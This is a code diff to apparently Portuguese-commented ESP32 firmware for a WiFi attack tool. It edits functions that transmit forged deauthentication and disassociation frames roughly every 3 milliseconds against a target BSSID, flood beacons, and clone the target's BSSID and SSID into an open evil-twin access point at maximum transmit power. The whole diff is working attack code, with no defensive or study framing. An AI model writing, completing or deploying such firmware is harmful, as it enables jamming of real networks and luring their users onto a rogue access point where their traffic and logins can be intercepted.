@@ -30,7 +30,7 @@ static uint8_t cloneHealthCheckFailures = 0;
 // ============================================================
 static uint16_t deauthSeqNum = 0;
 
-static void sendDeauthFrame(const uint8_t* bssid, const uint8_t* clientMac, uint8_t channel) {
+static void sendDeauthFrame(const uint8_t* bssid, const uint8_t* clientMac) {
     uint8_t frame[26];
     memset(frame, 0, 26);
 
@@ -65,16 +65,15 @@ static void sendDeauthFrame(const uint8_t* bssid, const uint8_t* clientMac, uint
     frame[24] = 0x07;
     frame[25] = 0x00;
 
-    // Forca o canal antes de transmitir
-    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
-    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
+    // WIFI_IF_STA em modo AP_STA + auto_seq=true (evita warning)
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, true);
     if (err == ESP_OK) {
         deauthPacketCount++;
         deauthSuccessCount++;
     }
 }
 
-static void sendDisassocFrame(const uint8_t* bssid, const uint8_t* clientMac, uint8_t channel) {
+static void sendDisassocFrame(const uint8_t* bssid, const uint8_t* clientMac) {
     uint8_t frame[26];
     memset(frame, 0, 26);
 
@@ -100,8 +99,7 @@ static void sendDisassocFrame(const uint8_t* bssid, const uint8_t* clientMac, ui
     frame[24] = 0x08; // Reason: STA leaving BSS
     frame[25] = 0x00;
 
-    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
-    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, true);
     if (err == ESP_OK) {
         deauthPacketCount++;
         deauthSuccessCount++;
@@ -109,9 +107,9 @@ static void sendDisassocFrame(const uint8_t* bssid, const uint8_t* clientMac, ui
 }
 
 // ============================================================
-// BEACON FLOOD (beacons sao permitidos sem bypass)
+// BEACON FLOOD
 // ============================================================
-static void sendBeaconFrame(const uint8_t* bssid, const char* ssid, uint8_t channel) {
+static void sendBeaconFrame(const uint8_t* bssid, const char* ssid) {
     uint8_t beacon[128];
     memset(beacon, 0, 128);
 
@@ -136,7 +134,7 @@ static void sendBeaconFrame(const uint8_t* bssid, const char* ssid, uint8_t chan
     beacon[22] = 0x00;
     beacon[23] = 0x00;
 
-    // Timestamp (8 bytes)
+    // Timestamp (8 bytes) - zeros
     // Beacon interval (2 bytes) = 0x0064 (100 TU)
     beacon[32] = 0x64;
     beacon[33] = 0x00;
@@ -154,8 +152,8 @@ static void sendBeaconFrame(const uint8_t* bssid, const char* ssid, uint8_t chan
 
     uint8_t frameLen = 38 + ssidLen;
 
-    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
-    esp_wifi_80211_tx(WIFI_IF_AP, beacon, frameLen, false);
+    // Beacons sao permitidos pela interface AP
+    esp_wifi_80211_tx(WIFI_IF_AP, beacon, frameLen, true);
 }
 
 // ============================================================
@@ -165,15 +163,6 @@ static bool isSoftAPActive() {
     wifi_mode_t mode;
     esp_wifi_get_mode(&mode);
     return (mode == WIFI_MODE_AP || mode == WIFI_MODE_APSTA);
-}
-
-static void generateMac(uint8_t* mac, uint8_t seed) {
-    mac[0] = 0x02;
-    mac[1] = 0x00;
-    mac[2] = 0x00;
-    mac[3] = seed;
-    mac[4] = seed ^ 0xAB;
-    mac[5] = seed ^ 0xCD;
 }
 
 // ============================================================
@@ -237,29 +226,23 @@ static void startBssidClone(uint8_t networkIndex) {
         target->bssid[0], target->bssid[1], target->bssid[2],
         target->bssid[3], target->bssid[4], target->bssid[5]);
 
-    // Desliga tudo primeiro
     WiFi.softAPdisconnect(true);
     delay(400);
 
-    // MODO AP PURO (sem STA) para evitar conflito de canal
-    WiFi.mode(WIFI_AP);
+    // MODO AP_STA (ambas as interfaces existem: STA=0, AP=1)
+    WiFi.mode(WIFI_AP_STA);
     delay(300);
 
-    // Seta o MAC ANTES de iniciar o AP
     esp_err_t macErr = esp_wifi_set_mac(WIFI_IF_AP, target->bssid);
     Serial.printf("[Clone] Set AP MAC result: %d (%s)\n", macErr, macErr == ESP_OK ? "OK" : "FAIL");
     delay(200);
 
-    // Inicia o AP com mesmo SSID e canal do alvo
     bool apOk = WiFi.softAP(cloneSSID, "", cloneChannel, 0, 8);
     WiFi.setTxPower(WIFI_POWER_19_5dBm);
     Serial.printf("[Clone] softAP result: %s\n", apOk ? "OK" : "FAIL");
 
     if (apOk) {
         WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
-        
-        // Garante que fica no canal correto
-        esp_wifi_set_channel(cloneChannel, WIFI_SECOND_CHAN_NONE);
         
         bssidCloneActive = true;
         deauthActive = true;
@@ -279,7 +262,7 @@ static void restartBssidClone() {
     WiFi.softAPdisconnect(true);
     delay(400);
     
-    WiFi.mode(WIFI_AP);
+    WiFi.mode(WIFI_AP_STA);
     delay(200);
     
     esp_wifi_set_mac(WIFI_IF_AP, deauthTargetBSSID);
@@ -289,7 +272,6 @@ static void restartBssidClone() {
     WiFi.setTxPower(WIFI_POWER_19_5dBm);
     if (apOk) {
         WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
-        esp_wifi_set_channel(cloneChannel, WIFI_SECOND_CHAN_NONE);
         cloneHealthCheckFailures = 0;
         Serial.println("[Clone] Restarted successfully");
     } else {
@@ -354,19 +336,18 @@ bool deauthLoop() {
 
     // === ENVIO CONTINUO DE DEAUTH/DISASSOC/BEACON ===
     static unsigned long lastDeauthTx = 0;
-    if (millis() - lastDeauthTx >= 3) { // A cada 3ms = ~333 pkt/s
+    if (millis() - lastDeauthTx >= 3) { // A cada 3ms
         lastDeauthTx = millis();
 
-        // Round-robin: deauth -> disassoc -> beacon -> deauth...
         static uint8_t txRound = 0;
         txRound++;
 
         if (txRound % 3 == 0) {
-            sendDeauthFrame(deauthTargetBSSID, nullptr, deauthTargetChannel);
+            sendDeauthFrame(deauthTargetBSSID, nullptr);
         } else if (txRound % 3 == 1) {
-            sendDisassocFrame(deauthTargetBSSID, nullptr, deauthTargetChannel);
+            sendDisassocFrame(deauthTargetBSSID, nullptr);
         } else {
-            sendBeaconFrame(deauthTargetBSSID, deauthTargetSSID, deauthTargetChannel);
+            sendBeaconFrame(deauthTargetBSSID, deauthTargetSSID);
         }
     }
 
